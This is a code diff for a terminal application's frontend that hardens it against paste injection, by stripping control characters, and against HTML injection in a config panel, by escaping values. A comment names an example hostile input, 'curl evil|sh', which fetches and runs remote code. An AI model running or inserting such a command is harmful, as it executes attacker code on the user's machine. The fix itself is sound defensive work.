@@ -1380,10 +1380,21 @@ function fmtTime(ts: number): string {
 }
 
 // Drop text into the active terminal (a row's text/url paste target).
+// Strip C0 control chars + DEL (newlines, carriage returns, ESC) from text
+// before it lands in a pty at the prompt. Activity rows (text/url/title arrive
+// unauthenticated over the ingest server) flow through here on double-click; an
+// embedded "\ncurl evil|sh\n" would otherwise auto-run on one click, and raw
+// ESC could inject terminal escape sequences. Legit payloads (file paths,
+// selections) carry no control chars, so this is a no-op for them.
+function sanitizePaste(data: string): string {
+  // eslint-disable-next-line no-control-regex
+  return data.replace(/[\x00-\x1f\x7f]+/g, " ");
+}
+
 function pasteToActive(data: string) {
   const id = activeId();
   if (!id || !data) return;
-  invoke("write_pty", { id, data }).catch(console.error);
+  invoke("write_pty", { id, data: sanitizePaste(data) }).catch(console.error);
   tabs.get(id)?.term.focus();
 }
 
@@ -1585,11 +1596,11 @@ function renderConfigPanel() {
   const head = document.createElement("div");
   head.className = "cfg-status";
   const errLine = cfg.error
-    ? `<div class="cfg-err">⚠ ${cfg.error} — using defaults</div>`
+    ? `<div class="cfg-err">⚠ ${escapeHtml(cfg.error)} — using defaults</div>`
     : "";
   head.innerHTML = `
-    <div>loaded from <b>${cfg.source}</b></div>
-    <code>${cfg.path}</code>
+    <div>loaded from <b>${escapeHtml(cfg.source)}</b></div>
+    <code>${escapeHtml(cfg.path)}</code>
     ${errLine}
     <div class="muted">${cfg.excluded_count} events blocked since launch ·
       patterns are case-insensitive; <code>*</code> is a wildcard</div>`;
